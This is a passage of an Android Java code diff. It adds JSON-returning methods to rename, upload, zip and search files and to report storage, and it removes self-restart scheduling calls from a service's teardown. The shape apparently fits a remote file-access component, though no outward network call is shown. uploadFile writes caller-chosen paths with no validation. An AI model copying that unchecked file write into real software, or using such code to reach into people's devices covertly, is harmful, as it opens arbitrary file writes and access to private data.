+                response.put("newPath", newFile.getAbsolutePath());
+                return response.toString();
+            } else {
+                return createErrorResponse("Failed to rename");
+            }
+            
+        } catch (JSONException e) {
+            e.printStackTrace();
+            return createErrorResponse("JSON error: " + e.getMessage());
+        } catch (Exception e) {
+            e.printStackTrace();
+            return createErrorResponse(e.getMessage());
+        }
+    }
+    
+    public String uploadFile(String path, String fileName, String base64Data) {
+        try {
+            File dir = new File(path);
+            if (!dir.exists()) {
+                dir.mkdirs();
+            }
+            
+            File file = new File(dir, fileName);
+            byte[] bytes = Base64.decode(base64Data, Base64.DEFAULT);
+            
+            FileOutputStream fos = new FileOutputStream(file);
+            fos.write(bytes);
+            fos.close();
+            
+            JSONObject response = new JSONObject();
+            response.put("success", true);
+            response.put("message", "File uploaded");
+            response.put("path", file.getAbsolutePath());
+            response.put("size", bytes.length);
+            
+            return response.toString();
+            
+        } catch (JSONException e) {
+            e.printStackTrace();
+            return createErrorResponse("JSON error: " + e.getMessage());
+        } catch (Exception e) {
+            e.printStackTrace();
+            return createErrorResponse(e.getMessage());
+        }
+    }
+    
+    public String zipFile(String path) {
+        try {
+            File source = new File(path);
+            File zipFile = new File(source.getParent(), source.getName() + ".zip");
+            
+            if (zipFile.exists()) {
+                zipFile.delete();
+            }
+            
+            FileOutputStream fos = new FileOutputStream(zipFile);
+            ZipOutputStream zos = new ZipOutputStream(fos);
+            
+            if (source.isDirectory()) {
+                zipDirectory(source, source.getName(), zos);
+            } else {
+                zipFile(source, source.getName(), zos);
+            }
+            
+            zos.close();
+            fos.close();
+            
+            JSONObject response = new JSONObject();
+            response.put("success", true);
+            response.put("message", "Zipped successfully");
+            response.put("path", zipFile.getAbsolutePath());
+            response.put("size", zipFile.length());
+            
+            return response.toString();
+            
+        } catch (JSONException e) {
+            e.printStackTrace();
+            return createErrorResponse("JSON error: " + e.getMessage());
+        } catch (Exception e) {
+            e.printStackTrace();
+            return createErrorResponse(e.getMessage());
+        }
+    }
+    
+    private void zipDirectory(File folder, String parentFolder, ZipOutputStream zos) throws Exception {
+        File[] files = folder.listFiles();
+        if (files != null) {
+            for (File file : files) {
+                if (file.isDirectory()) {
+                    zipDirectory(file, parentFolder + "/" + file.getName(), zos);
+                } else {
+                    zipFile(file, parentFolder + "/" + file.getName(), zos);
+                }
+            }
+        }
+    }
+    
+    private void zipFile(File file, String entryName, ZipOutputStream zos) throws Exception {
+        byte[] buffer = new byte[1024];
+        FileInputStream fis = new FileInputStream(file);
+        zos.putNextEntry(new ZipEntry(entryName));
+        
+        int length;
+        while ((length = fis.read(buffer)) > 0) {
+            zos.write(buffer, 0, length);
         }
         
-        scheduleAllJobs();
-        scheduleRestartWithAlarm();
+        zos.closeEntry();
+        fis.close();
+    }
+    
+    public String searchFiles(String path, String query) {
+        try {
+            File dir = new File(path);
+            if (!dir.exists() || !dir.isDirectory()) {
+                return createErrorResponse("Invalid directory");
+            }
+            
+            JSONArray results = new JSONArray();
+            searchInDirectory(dir, query.toLowerCase(), results);
+            
+            JSONObject response = new JSONObject();
+            response.put("success", true);
+            response.put("results", results);
+            response.put("count", results.length());
+            
+            return response.toString();
+            
+        } catch (JSONException e) {
+            e.printStackTrace();
+            return createErrorResponse("JSON error: " + e.getMessage());
+        } catch (Exception e) {
+            e.printStackTrace();
+            return createErrorResponse(e.getMessage());
+        }
+    }
+    
+    private void searchInDirectory(File dir, String query, JSONArray results) throws Exception {
+        File[] files = dir.listFiles();
+        if (files == null) return;
         
-        super.onDestroy();
+        for (File file : files) {
+            if (file.getName().toLowerCase().contains(query)) {
+                JSONObject fileObj = new JSONObject();
+                fileObj.put("name", file.getName());
+                fileObj.put("path", file.getAbsolutePath());
+                fileObj.put("isDirectory", file.isDirectory());
+                fileObj.put("size", file.length());
+                fileObj.put("lastModified", file.lastModified());
+                results.put(fileObj);
+            }
+            
+            if (file.isDirectory()) {
+                searchInDirectory(file, query, results);
+            }
+        }
+    }
+    
+    public String getStorageInfo() {
+        try {
+            JSONObject info = new JSONObject();
+            
+            // Internal storage
+            File internal = Environment.getExternalStorageDirectory();
+            if (internal != null) {
+                JSONObject internalInfo = new JSONObject();
+                internalInfo.put("path", internal.getAbsolutePath());
+                internalInfo.put("total", internal.getTotalSpace());
+                internalInfo.put("free", internal.getFreeSpace());
+                internalInfo.put("used", internal.getTotalSpace() - internal.getFreeSpace());
+                info.put("internal", internalInfo);
+            }
+            
+            // Check for external SD card
+            File[] externalFiles = context.getExternalFilesDirs(null);
+            if (externalFiles.length > 1 && externalFiles[1] != null) {
+                JSONObject externalInfo = new JSONObject();
+                externalInfo.put("path", externalFiles[1].getAbsolutePath());
+                externalInfo.put("available", true);
+                info.put("external", externalInfo);
+            }
+            
+            info.put("success", true);
+            return info.toString();
+            
+        } catch (JSONException e) {
+            e.printStackTrace();
+            return createErrorResponse("JSON error: " + e.getMessage());
+        } catch (Exception e) {
+            e.printStackTrace();
+            return createErrorResponse(e.getMessage());
+        }
+    }
+    
+    private String getFileExtension(String fileName) {
+        int lastDot = fileName.lastIndexOf('.');
+        if (lastDot > 0 && lastDot < fileName.length() - 1) {
+            return fileName.substring(lastDot + 1).toLowerCase();
+        }
+        return "";
+    }
+    
+    private String getMimeType(String fileName) {
+        String extension = getFileExtension(fileName);
+        if (extension.isEmpty()) return "application/octet-stream";
+        
+        MimeTypeMap mime = MimeTypeMap.getSingleton();
+        String type = mime.getMimeTypeFromExtension(extension);
+        return type != null ? type : "application/octet-stream";
+    }
+    
+    private String createErrorResponse(String message) {
+        try {
+            JSONObject error = new JSONObject();
+            error.put("success", false);
+            error.put("error", message);
+            return error.toString();
+        } catch (JSONException e) {
+            return "{\"success\":false,\"error\":\"" + message + "\"}";
+        }
     }
 }
